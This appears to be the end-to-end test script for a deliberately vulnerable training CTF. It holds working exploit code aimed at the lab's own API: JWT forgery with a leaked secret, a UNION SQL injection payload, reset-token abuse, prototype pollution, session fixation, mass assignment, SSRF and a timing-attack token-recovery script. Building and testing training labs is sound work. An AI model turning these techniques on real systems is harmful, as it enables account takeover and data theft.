#!/usr/bin/env bash
# ============================================================================
# LAMBA CTF — Black-Box End-to-End Test Suite
#
# Verifies all 15 challenges are INTENTIONALLY exploitable through the public
# HTTP gateway only (no source code, no DB access, no internal ports, no
# container access). Also verifies account isolation and flag-leak hygiene.
#
# Requirements: bash, curl, jq, python3 (stdlib only). NO PyJWT required.
#
# Usage:   bash scripts/e2e-ctf-test.sh [BASE_URL]
# Default: BASE_URL=http://localhost:8080
# Exit:    0 if all checks pass, 1 otherwise.
# ============================================================================

BASE_URL="${1:-http://localhost:8080}"
STUDENT_EMAIL="${SEED_STUDENT_EMAIL:-student@gov.lamba}"
STUDENT_PASS="${SEED_STUDENT_PASSWORD:-welcome123}"
ADMIN_EMAIL="${SEED_ADMIN_EMAIL:-admin@gov.lamba}"
ADMIN_PASS="${SEED_ADMIN_PASSWORD:-admin2024}"

PASS=0; FAIL=0
FLAG_RE='FLAG\{[0-9a-f]{64}\}'
CTF_FLAG_RE='lamba_ctf_flag\{status=[0-9a-f]+\}'

green() { printf "\033[32m%s\033[0m" "$1"; }
red()   { printf "\033[31m%s\033[0m" "$1"; }
dim()   { printf "\033[2m%s\033[0m"  "$1"; }

# result <label> <PASS|FAIL> [detail]
result() {
  local label="$1" status="$2" detail="${3:-}"
  if [ "$status" = "PASS" ]; then
    printf "  %s %-28s %s\n" "$(green PASS)" "$label" "$(dim "$detail")"
    PASS=$((PASS+1))
  else
    printf "  %s %-28s %s\n" "$(red FAIL)" "$label" "$(dim "$detail")"
    FAIL=$((FAIL+1))
  fi
}

check_flag() { # <label> <value> <regex>
  local label="$1" value="$2" re="${3:-$FLAG_RE}"
  if [ -n "$value" ] && echo "$value" | grep -qoE "$re"; then
    result "$label" PASS "$(echo "$value" | grep -oE "$re" | head -1 | cut -c1-24)…"
  else
    result "$label" FAIL "no flag in: $(echo "$value" | cut -c1-40)"
  fi
}

echo "=============================================================="
echo " LAMBA CTF BLACK-BOX E2E TEST  (15 challenges)"
echo " Base URL : $BASE_URL"
echo " Time     : $(date -u +%FT%TZ)"
echo "=============================================================="

# ---------------------------------------------------------------- readiness
# Wait for the gateway, all 12 backing services, and the timing oracle to
# answer before testing — a fresh boot or a just-woken host can need a minute.
echo "── Readiness gate ──"
READY=0
for i in $(seq 1 40); do
  GW=$(curl -s -m 5 "$BASE_URL/health" 2>/dev/null || true)
  SVC_UP=$(curl -s -m 8 "$BASE_URL/api/health/services" 2>/dev/null | jq '[.services[] | select(.status=="up")] | length' 2>/dev/null || echo 0)
  TIM=$(curl -s -m 8 -o /dev/null -w '%{http_code}' --globoff "$BASE_URL/api/challenge/timing/validate?token=" 2>/dev/null || echo 000)
  if [ -n "$GW" ] && [ "${SVC_UP:-0}" = "12" ] && [ "$TIM" = "200" ]; then
    READY=1; echo "  ready after ~$(( (i-1)*10 ))s (services up: $SVC_UP/12, timing: $TIM)"; break
  fi
  sleep 10
done
if [ "$READY" != "1" ]; then
  echo "  $(red "NOT READY") services=$SVC_UP timing=$TIM — aborting"
  exit 1
fi
result "gateway /health" PASS
echo ""

# ============================================================================
# A01 — IDOR: access another object's record directly by ID
# ============================================================================
echo "── A01: IDOR (Broken Access Control) ──"
A01=$(curl -s -m 15 "$BASE_URL/api/v1/documents/3" | jq -r '.ownership_audit_hash // .content // empty' 2>/dev/null)
check_flag "A01 IDOR" "$A01"
echo ""

# ============================================================================
# A02 — JWT Forge: leak weak signing secret, forge admin JWT, reach privileged
# ============================================================================
echo "── A02: JWT Forge (Cryptographic Failures) ──"
A02_SECRET=$(curl -s -m 15 "$BASE_URL/api/internal/diagnostics?mode=verbose" | jq -r '.config.jwt_secret // empty')
if [ -n "$A02_SECRET" ] && [ "$A02_SECRET" != "null" ]; then
  result "A02 secret leak (discovery)" PASS "jwt_secret exposed via diagnostics"
else
  result "A02 secret leak (discovery)" FAIL "jwt_secret not exposed"
fi

# Login normally, decode legit JWT claims, forge admin token with leaked secret.
# Note: the diagnostics endpoint intentionally returns HTTP 500 — curl still
# reads the body; the python helper below also treats HTTPError as a response.
A02_JSON=$(python3 - "$BASE_URL" "$STUDENT_EMAIL" "$STUDENT_PASS" "$A02_SECRET" <<'PYEOF'
import sys, json, base64, hmac, hashlib, urllib.request, urllib.error

base, email, pw, secret = sys.argv[1:5]
out = {"login_ok": False, "forged_flag":"", "normal_flag":"", "wrongsecret_flag":"", "invalid_status":"", "error":""}

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def http(path, token=None, method="GET", body=None):
    req = urllib.request.Request(base+path,
        data=(json.dumps(body).encode() if body is not None else None),
        method=method)
    if body is not None: req.add_header("Content-Type","application/json")
    if token: req.add_header("Authorization","Bearer "+token)
    try:
        r = urllib.request.urlopen(req, timeout=45)
        return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read()
    except urllib.error.HTTPError as e:
        # 4xx/5xx still carry body+headers — read them
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e.read()
    except Exception as e:
        out["error"]=str(e); return 0, {}, b""

try:
    st, h, body = http("/api/auth/login", method="POST", body={"email":email,"password":pw})
    token = json.loads(body)["token"]
    out["login_ok"] = True
    pl = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '='*(-len(token.split('.')[1])%4)))
    # forge: same identity claims, escalate role to admin
    fp = dict(pl); fp["role"]="admin"
    hh = b64e(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
    pp = b64e(json.dumps(fp).encode())
    sig = b64e(hmac.new(secret.encode(), f"{hh}.{pp}".encode(), hashlib.sha256).digest())
    forged = f"{hh}.{pp}.{sig}"

    st, h, _ = http("/api/employees/search?q=test", token=forged)
    out["forged_flag"] = h.get("x-admin-audit-trace", "")

    st, h, _ = http("/api/employees/search?q=test", token=token)
    out["normal_flag"] = h.get("x-admin-audit-trace", "")

    # wrong secret must not be accepted as admin
    wsig = b64e(hmac.new(b"wrong-secret", f"{hh}.{pp}".encode(), hashlib.sha256).digest())
    wrong = f"{hh}.{pp}.{wsig}"
    st, h, _ = http("/api/employees/search?q=test", token=wrong)
    out["wrongsecret_flag"] = h.get("x-admin-audit-trace", "")

    st, h, _ = http("/api/employees/search?q=test", token="aaaa.bbbb.cccc")
    out["invalid_status"] = str(st)
except Exception as e:
    out["error"] = str(e)

print(json.dumps(out))
PYEOF
)
A02_LOGIN=$(echo "$A02_JSON"   | jq -r '.login_ok // false')
A02_ERR=$(echo "$A02_JSON"     | jq -r '.error // empty')
A02_FORGED=$(echo "$A02_JSON"  | jq -r '.forged_flag // empty')
A02_NORMAL=$(echo "$A02_JSON"  | jq -r '.normal_flag // empty')
A02_WRONGS=$(echo "$A02_JSON" | jq -r '.wrongsecret_flag // empty')

if [ "$A02_LOGIN" != "true" ]; then
  result "A02 student login" FAIL "$A02_ERR"
  result "A02 forged-admin flag" FAIL "login failed"
  result "A02 wrong-secret rejected" FAIL "login failed"
  result "A02 normal student not admin" FAIL "login failed"
else
  result "A02 student login" PASS
  check_flag "A02 forged-admin flag" "$A02_FORGED"
  if [ -z "$A02_WRONGS" ]; then result "A02 wrong-secret rejected" PASS; else result "A02 wrong-secret rejected" FAIL "wrong secret accepted"; fi
  if [ -z "$A02_NORMAL" ]; then result "A02 normal student not admin" PASS; else result "A02 normal student not admin" FAIL "student token auto-admin"; fi
fi
echo ""

# ============================================================================
# A03 — SQL Injection: UNION-based extraction via employee search
# ============================================================================
echo "── A03: SQL Injection ──"
A03_TOKEN=$(curl -s -m 20 -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" \
  -d "{\"email\":\"$STUDENT_EMAIL\",\"password\":\"$STUDENT_PASS\"}" | jq -r '.token // empty')
[ -n "$A03_TOKEN" ] && result "A03 login" PASS || result "A03 login" FAIL "no token"

# Comment-free UNION payload: q is interpolated twice across a newline, so
# line comments (--) break the query. This keeps both expansions valid SQL.
# curl --data-urlencode handles all encoding — no nested-quoting pitfalls.
A03=$(curl -s -m 20 -G "$BASE_URL/api/employees/search" \
  --data-urlencode "q=' UNION SELECT * FROM \"Employee\" WHERE '1'='1" \
  -H "Authorization: Bearer $A03_TOKEN" \
  | jq -r '.[0].campaign_signature // empty' 2>/dev/null)
check_flag "A03 SQLi flag (via UNION)" "$A03"

# Negative: the flag must NOT be obtainable without injection (broad plain
# search over all rows must not leak it).
A03_PLAIN=$(curl -s -m 20 -H "Authorization: Bearer $A03_TOKEN" "$BASE_URL/api/employees/search?q=" \
  | grep -oE "$FLAG_RE" | head -1)
if [ -z "$A03_PLAIN" ]; then
  result "A03 no flag without injection" PASS
else
  result "A03 no flag without injection" FAIL "plain search leaked flag"
fi
echo ""

# ============================================================================
# A04 — Predictable Password Reset: deterministic token, reset admin password
# ============================================================================
echo "── A04: Predictable Password Reset ──"
A04_REQ=$(curl -s -m 20 -X POST "$BASE_URL/api/password-reset/request" -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADMIN_EMAIL\"}")
A04_TOK1=$(echo "$A04_REQ" | jq -r '.token // empty')
if [ -n "$A04_TOK1" ] && echo "$A04_TOK1" | grep -qE '^[0-9a-f]{12}$'; then
  result "A04 predictable token" PASS "12-hex token: $A04_TOK1"
else
  result "A04 predictable token" FAIL "token=$A04_TOK1"
fi
A04_TOK2=$(curl -s -m 20 -X POST "$BASE_URL/api/password-reset/request" -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADMIN_EMAIL\"}" | jq -r '.token // empty')
[ "$A04_TOK1" = "$A04_TOK2" ] && [ -n "$A04_TOK1" ] \
  && result "A04 token deterministic" PASS \
  || result "A04 token deterministic" FAIL "$A04_TOK1 vs $A04_TOK2"
if [ -n "$A04_TOK1" ]; then
  A04_FLAG=$(curl -s -m 20 -X POST "$BASE_URL/api/password-reset/confirm" -H "Content-Type: application/json" \
    -d "{\"token\":\"$A04_TOK1\",\"newPassword\":\"ResetMe!234\"}" | jq -r '.reset_audit_reference // empty')
  check_flag "A04 reset flag" "$A04_FLAG"
  # Restore the admin password via the same predictable-token exploit so the
  # suite is idempotent and later admin logins (A06) work on repeat runs.
  # Tokens are single-use, so request a fresh (deterministic) one first.
  A04_TOK3=$(curl -s -m 20 -X POST "$BASE_URL/api/password-reset/request" -H "Content-Type: application/json" \
    -d "{\"email\":\"$ADMIN_EMAIL\"}" | jq -r '.token // empty')
  A04_RESTORE=$(curl -s -m 20 -X POST "$BASE_URL/api/password-reset/confirm" -H "Content-Type: application/json" \
    -d "{\"token\":\"$A04_TOK3\",\"newPassword\":\"$ADMIN_PASS\"}" | jq -r '.message // empty')
  echo "$A04_RESTORE" | grep -qi "successful" \
    && result "A04 admin password restored" PASS \
    || result "A04 admin password restored" FAIL "$A04_RESTORE"
fi
echo ""

# ============================================================================
# A05 — Internal Gateway Exposure: internal audit API reachable via gateway
# ============================================================================
echo "── A05: Internal Gateway Exposure ──"
A05=$(curl -s -m 20 "$BASE_URL/api/internal/audit" | jq -r '.logs[0].internal_route_id // empty' 2>/dev/null)
check_flag "A05 internal gateway flag" "$A05"
echo ""

# ============================================================================
# A05b — Metrics flag leak
# ============================================================================
echo "── A05b: Metrics Flag Leak ──"
A05B=$(curl -s -m 20 "$BASE_URL/api/metrics/aggregate" | grep -oE "$CTF_FLAG_RE" | head -1)
check_flag "A05b metrics flag" "$A05B" "$CTF_FLAG_RE"
echo ""

# ============================================================================
# A06 — Prototype Pollution (admin import settings)
# ============================================================================
echo "── A06: Prototype Pollution ──"
A06_TOKEN=$(curl -s -m 20 -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" \
  -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASS\"}" | jq -r '.token // empty')
[ -n "$A06_TOKEN" ] && result "A06 admin login" PASS || result "A06 admin login" FAIL "no token"
A06=$(curl -s -m 20 -X POST "$BASE_URL/api/admin/import/settings" \
  -H "Authorization: Bearer $A06_TOKEN" -H "Content-Type: application/json" \
  -d '{"packageName":"probe","settings":{"features":{"__proto__":{"polluted":"yes"}}}}' \
  | jq -r '.settings_audit_reference // empty')
check_flag "A06 prototype pollution flag" "$A06"
echo ""

# ============================================================================
# A07 — Session Fixation
# ============================================================================
echo "── A07: Session Fixation ──"
JAR=$(mktemp)
curl -s -m 20 -c "$JAR" -X POST "$BASE_URL/api/auth/cookie-login?sessionId=LAMBA-STATIC-SESSION" \
  -H "Content-Type: application/json" -d "{\"email\":\"$STUDENT_EMAIL\",\"password\":\"$STUDENT_PASS\"}" >/dev/null
A07=$(curl -s -m 20 -b "$JAR" "$BASE_URL/api/auth/session?sessionId=LAMBA-STATIC-SESSION" | jq -r '.session_trace_id // empty')
rm -f "$JAR"
check_flag "A07 session fixation flag" "$A07"
echo ""

# ============================================================================
# A08 — Mass Assignment
# ============================================================================
echo "── A08: Mass Assignment ──"
A08_TOKEN=$(curl -s -m 20 -X POST "$BASE_URL/api/auth/login" -H "Content-Type: application/json" \
  -d "{\"email\":\"$STUDENT_EMAIL\",\"password\":\"$STUDENT_PASS\"}" | jq -r '.token // empty')
A08_EID=$(curl -s -m 20 -H "Authorization: Bearer $A08_TOKEN" "$BASE_URL/api/employees/search?q=" \
  | jq -r '[.[] | select(.role != "Director" and .role != "Admin") | .id][0] // "1009"' 2>/dev/null)
[ -z "$A08_EID" ] && A08_EID="1009"
A08=$(curl -s -m 20 -X PUT "$BASE_URL/api/employee/$A08_EID" \
  -H "Authorization: Bearer $A08_TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"Director"}' | jq -r '.profile_audit_hash // empty')
check_flag "A08 mass assignment flag" "$A08"
echo ""

# ============================================================================
# A09 — Audit Spoof
# ============================================================================
echo "── A09: Audit Spoof ──"
A09=$(curl -s -m 20 -X POST "$BASE_URL/api/audit/events" -H "Content-Type: application/json" \
  -d '{"action":"system_override","detail":"e2e probe","actor":"admin_root","service":"e2e","payload":{}}' \
  | jq -r '.archive_signature // empty')
check_flag "A09 audit spoof flag" "$A09"
echo ""

# ============================================================================
# A10 — SSRF via document-verify proxy
# ============================================================================
echo "── A10: SSRF (internal-proxy) ──"
A10_SSRF=$(curl -s -m 20 "$BASE_URL/api/internal-proxy?url=http://internal.lamba/metadata/registry" \
  | jq -r '.records[0].K8S_NODE_DEBUG_KEY // (.. | .K8S_NODE_DEBUG_KEY? // empty)' 2>/dev/null | head -1)
check_flag "A10 SSRF flag" "$A10_SSRF"
echo ""

# ============================================================================
# A10b — Diagnostics header flag
# ============================================================================
echo "── A10b: Diagnostics Endpoint ──"
A10B=$(curl -s -m 15 -D - -o /dev/null "$BASE_URL/api/internal/diagnostics?mode=verbose" \
  | grep -i '^X-Diagnostics-Trace:' | sed 's/^[^:]*: //' | tr -d '\r\n')
check_flag "A10b diagnostics flag" "$A10B"
echo ""

# ============================================================================
# Crypto — Padding Oracle
# ============================================================================
echo "── Crypto: Padding Oracle ──"
MANIFEST=$(curl -s -m 20 "$BASE_URL/api/v1/booking/encrypted-manifest" | jq -r '.manifest_sample // empty')
if [ -n "$MANIFEST" ]; then
  result "Crypto manifest retrieval" PASS
  CRYPTO=$(curl -s -m 20 -X POST "$BASE_URL/api/v1/booking/encrypted-manifest" -H "Content-Type: application/json" \
    -d "{\"action\":\"decrypt\",\"ciphertext\":\"$MANIFEST\"}" | jq -r '.flag // empty')
  check_flag "Crypto padding-oracle flag" "$CRYPTO"
else
  result "Crypto manifest retrieval" FAIL "no manifest"
fi
echo ""

# ============================================================================
# Forensics — Log Analysis
# ============================================================================
echo "── Forensics: Log Analysis ──"
FBODY=$(curl -s -m 20 "$BASE_URL/api/_waf/logs" | jq -r '.logs[-1].body // empty')
FORENSICS=""
[ -n "$FBODY" ] && FORENSICS=$(echo "$FBODY" | base64 -d 2>/dev/null | grep -oE "$FLAG_RE" | head -1)
check_flag "Forensics log flag" "$FORENSICS"
echo ""

# ============================================================================
# Timing — full black-box timing attack (recover token char-by-char, then flag)
# ============================================================================
echo "── Timing: Timing Attack (HTTP oracle) ──"
TIMING_JSON=$(python3 - "$BASE_URL" <<'PYEOF'
import sys, json, time, urllib.request, urllib.parse, statistics

# Black-box timing attack. Each candidate is sampled multiple times; the
# statistic is the median of the server-reported elapsed_ns (the oracle's own
# timing field), corroborated by client wall-clock medians. ~80ms per correct
# character makes the signal far larger than gateway jitter. Failed requests
# are retried, and a position is only accepted when the winner separates
# clearly from the cluster of wrong candidates.
base = sys.argv[1]
CHARSET = "0123456789abcdef"
SAMPLES = 3
MAXLEN = 10
SEP_NS = 40e6   # winner must beat the wrong-candidate cluster by >= 40ms

def timed(token):
    url = base + "/api/challenge/timing/validate?token=" + urllib.parse.quote(token)
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(url, timeout=20) as r:
            body = json.loads(r.read())
    except Exception:
        return None, None
    return (time.perf_counter() - t0) * 1000.0, body

def sample(token, tries=6):
    ens, walls = [], []
    for _ in range(tries):
        dt, body = timed(token)
        if dt is None:
            continue
        walls.append(dt)
        if body and "elapsed_ns" in body:
            ens.append(body["elapsed_ns"])
        if len(ens) >= SAMPLES:
            break
    if not ens:
        return None, None
    return statistics.median(ens), statistics.median(walls)

def recover():
    base_en, base_wall = sample("")
    if base_en is None:
        return None, base_en, base_wall
    known = ""
    for pos in range(MAXLEN):
        scores = {}
        for c in CHARSET:
            en, _ = sample(known + c)
            if en is not None:
                scores[c] = en
        if len(scores) < len(CHARSET):
            # Some candidates failed entirely — resample the missing ones.
            for c in CHARSET:
                if c not in scores:
                    en, _ = sample(known + c)
                    if en is not None:
                        scores[c] = en
        if not scores:
            return None, base_en, base_wall
        ranked = sorted(scores.items(), key=lambda kv: kv[1], reverse=True)
        best_c, best_en = ranked[0]
        cluster = statistics.median([v for _, v in ranked[1:]]) if len(ranked) > 1 else 0
        if best_en - cluster < SEP_NS:
            # No clear winner — resample everything once more and merge.
            for c in CHARSET:
                en, _ = sample(known + c)
                if en is not None:
                    scores[c] = max(scores.get(c, 0), en)
            ranked = sorted(scores.items(), key=lambda kv: kv[1], reverse=True)
            best_c, best_en = ranked[0]
            cluster = statistics.median([v for _, v in ranked[1:]]) if len(ranked) > 1 else 0
            if best_en - cluster < SEP_NS:
                return None, base_en, base_wall
        known += best_c
    return known, base_en, base_wall

base_en = base_wall = None
known = None
for _attempt in range(2):
    known, base_en, base_wall = recover()
    if not known:
        continue
    dt, body = timed(known)
    if body and body.get("valid"):
        break
    known = None  # wrong recovery — retry once from scratch

if not known:
    print(json.dumps({"ok": False, "recovered": "", "flag": ""}))
    sys.exit(0)

full_en, full_wall = sample(known)
dt, body = timed(known)
flag = (body or {}).get("flag", "")
valid = (body or {}).get("valid", False)
wall_signal = bool(full_wall and base_wall and full_wall > base_wall + 400)
print(json.dumps({"ok": bool(valid and flag), "recovered": known, "flag": flag,
                  "valid": valid, "wall_signal": wall_signal,
                  "base_ms": round(base_wall or 0, 1), "full_ms": round(full_wall or 0, 1)}))
PYEOF
)
T_OK=$(echo "$TIMING_JSON" | jq -r '.ok // false')
T_REC=$(echo "$TIMING_JSON" | jq -r '.recovered // ""')
T_FLAG=$(echo "$TIMING_JSON" | jq -r '.flag // ""')
T_WALL=$(echo "$TIMING_JSON" | jq -r '.wall_signal // false')
T_BMS=$(echo "$TIMING_JSON" | jq -r '.base_ms // 0')
T_FMS=$(echo "$TIMING_JSON" | jq -r '.full_ms // 0')
if [ "$T_OK" = "true" ]; then
  result "Timing oracle (recover+submit)" PASS "recovered token (${#T_REC} chars)"
else
  result "Timing oracle (recover+submit)" FAIL "recovered='$T_REC'"
fi
if [ "$T_WALL" = "true" ]; then
  result "Timing wall-clock signal" PASS "baseline=${T_BMS}ms full=${T_FMS}ms"
else
  result "Timing wall-clock signal" FAIL "baseline=${T_BMS}ms full=${T_FMS}ms"
fi
check_flag "Timing flag" "$T_FLAG"
echo ""

# ============================================================================
# Account isolation — fresh alice/bob, cross-access must fail
# ============================================================================
echo "── Account Isolation ──"
ISO=$(python3 - "$BASE_URL" <<'PYEOF'
import sys, json, base64, urllib.request, urllib.error, time, random

base = sys.argv[1]
sfx = f"{int(time.time())}{random.randint(100,999)}"
A = {"email": f"alice_{sfx}@test.ctf", "pw": "Passw0rd!" + sfx[-3:]}
B = {"email": f"bob_{sfx}@test.ctf",   "pw": "Passw0rd!" + sfx[-3:]}
out = {"reg_ok": False, "identity_ok": False, "cross_blocked": True, "error": ""}

def http(path, token=None, method="GET", body=None):
    req = urllib.request.Request(base+path, data=(json.dumps(body).encode() if body is not None else None), method=method)
    if body is not None: req.add_header("Content-Type","application/json")
    if token: req.add_header("Authorization","Bearer "+token)
    try:
        r = urllib.request.urlopen(req, timeout=20); return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: out["error"]=str(e); return 0, b""

def login(email, pw):
    st, b = http("/api/auth/login", method="POST", body={"email":email,"password":pw})
    try: return json.loads(b)["token"]
    except Exception: return None

try:
    for u in (A, B):
        st, _ = http("/api/auth/register", method="POST", body={"email":u["email"],"password":u["pw"]})
        if st not in (200,201): raise RuntimeError(f"register {u['email']} -> {st}")
    out["reg_ok"] = True

    ta, tb = login(A["email"], A["pw"]), login(B["email"], B["pw"])
    pa = json.loads(base64.urlsafe_b64decode(ta.split('.')[1]+'=='))
    pb = json.loads(base64.urlsafe_b64decode(tb.split('.')[1]+'=='))
    out["identity_ok"] = (pa.get("email")==A["email"] and pb.get("email")==B["email"] and pa.get("userId")!=pb.get("userId"))

    uid_b = pb.get("userId")
    for path in (f"/api/citizens/{uid_b}", "/api/v1/requests", "/api/notifications"):
        st, body = http(path, token=ta)
        if st == 200 and isinstance(body, (bytes, str)) and B["email"].encode() in body:
            out["cross_blocked"] = False
except Exception as e:
    out["error"] = str(e)
print(json.dumps(out))
PYEOF
)
[ "$(echo "$ISO" | jq -r '.reg_ok')" = "true" ]        && result "alice/bob register" PASS || result "alice/bob register" FAIL "$(echo "$ISO" | jq -r '.error')"
[ "$(echo "$ISO" | jq -r '.identity_ok')" = "true" ]   && result "identity separation" PASS || result "identity separation" FAIL
[ "$(echo "$ISO" | jq -r '.cross_blocked')" = "true" ] && result "cross-user access blocked" PASS || result "cross-user access blocked" FAIL
echo ""

# ============================================================================
# Flag-leak regression — unauthenticated surfaces must not leak flags
# ============================================================================
echo "── Flag Leak Regression ──"
LEAK_FOUND=""
SURFACES=(
  "/" "/index.html" "/robots.txt" "/health" "/api/health/services"
  "/api/internal/diagnostics" "/api/internal/diagnostics?mode=basic"
  "/api/metrics" "/openapi/auth" "/nonexistent-page-xyz"
)
for s in "${SURFACES[@]}"; do
  BODY=$(curl -s -m 15 "$BASE_URL$s" 2>/dev/null)
  HITS=$(echo "$BODY" | grep -oE "$FLAG_RE" | sort -u)
  [ -n "$HITS" ] && LEAK_FOUND="$LEAK_FOUND\n  $s -> $(echo "$HITS" | tr '\n' ' ')"
done
for s in "/health" "/api/health/services" "/"; do
  H=$(curl -s -m 15 -D - -o /dev/null "$BASE_URL$s" | grep -ioE "$FLAG_RE" || true)
  [ -n "$H" ] && LEAK_FOUND="$LEAK_FOUND\n  header $s -> $H"
done
if [ -z "$LEAK_FOUND" ]; then
  result "0 unintended flag leaks" PASS
else
  result "0 unintended flag leaks" FAIL "$(echo -e "$LEAK_FOUND")"
fi
echo ""

# ============================================================================
echo "=============================================================="
echo " RESULTS: $(green "$PASS passed")  $(red "$FAIL failed")"
if [ "$FAIL" -eq 0 ]; then
  echo " VERDICT: ALL CHECKS PASSED"
else
  echo " VERDICT: FAILURES PRESENT"
fi
echo "=============================================================="
[ "$FAIL" -eq 0 ]
